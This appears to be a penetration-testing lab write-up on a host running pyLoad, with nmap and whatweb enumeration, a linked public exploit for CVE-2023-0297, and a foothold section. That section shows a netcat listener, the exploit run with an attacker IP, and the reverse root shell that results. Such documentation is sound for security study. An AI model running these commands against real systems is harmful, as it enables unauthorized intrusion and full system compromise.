## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.142.26

# HOSTNAME

# OPERATING SYSTEM

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- OpenSSH 8.9p1

9666/tcp open  http    syn-ack ttl 61 CherryPy wsgiserver
- Cheroot/8.6.0
- Pyload

```
# ENUMERATION
```bash
# Port 9666 HTTP
9666/tcp open  http    syn-ack ttl 61 CherryPy wsgiserver

- sudo whatweb $url
http://192.168.142.26:9666 [302 Found] Country[RESERVED][ZZ], HTML5, 
HTTPServer[Cheroot/8.6.0], IP[192.168.142.26], 
RedirectLocation[/login?next=http://192.168.142.26:9666/], Title[Redirecting...]

http://192.168.142.26:9666/login?next=http://192.168.142.26:9666/ 
[200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, 
HTTPServer[Cheroot/8.6.0], IP[192.168.142.26], 
JQuery, PasswordField[password], Script[text/javascript], Title[Login - pyLoad]

# Found exploit for pyload
https://github.com/JacobEbben/CVE-2023-0297

```
## FOOTHOLD
```bash
# Exploit
https://github.com/JacobEbben/CVE-2023-0297
sudo nc -nvlp 80
python3 exploit.py -t http://192.168.142.26:9666 -I 192.168.45.212 -P 80

connect to [192.168.45.212] from (UNKNOWN) [192.168.142.26] 49148
bash: cannot set terminal process group (901): Inappropriate ioctl for device
bash: no job control in this shell
root@pyloader:~/.pyload/data# id
id
uid=0(root) gid=0(root) groups=0(root)
root@pyloader:~/.pyload/data# whoami
whoami
root
root@pyloader:~/.pyload/data# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:a6:9b brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.142.26/24 brd 192.168.142.255 scope global ens160
       valid_lft forever preferred_lft forever
root@pyloader:~/.pyload/data# 

# root
```
## NMAP
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa

9666/tcp open  http    syn-ack ttl 61 CherryPy wsgiserver
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.142.26:9666/
|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
|_http-server-header: Cheroot/8.6.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

